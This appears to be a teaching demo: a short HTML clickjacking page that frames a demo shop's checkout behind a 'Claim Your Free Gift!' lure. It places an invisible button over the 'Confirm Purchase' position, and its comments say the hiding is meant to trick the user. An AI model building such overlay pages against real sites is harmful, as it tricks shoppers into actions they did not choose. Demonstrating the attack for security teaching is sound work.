<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Demo</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        .overlay {
            position: absolute;
            top: 450px; /* Điều chỉnh để căn chỉnh với nút Confirm Purchase */
            left: 650px; /* Điều chỉnh để căn chỉnh với nút Confirm Purchase */
            opacity: 0; /* Ẩn hoàn toàn để lừa người dùng */
            z-index: 10;
        }
        iframe {
            width: 100%;
            height: 800px;
            border: none;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #ff4500;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #cc3700;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Claim Your Free Gift!</h1>
        <p>Click the button below to get your exclusive offer!</p>
    </div>
    <iframe src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
    <div class="overlay">
        <button onclick="alert('You clicked the fake button!')">Claim Free Gift</button>
    </div>
</body>
</html>
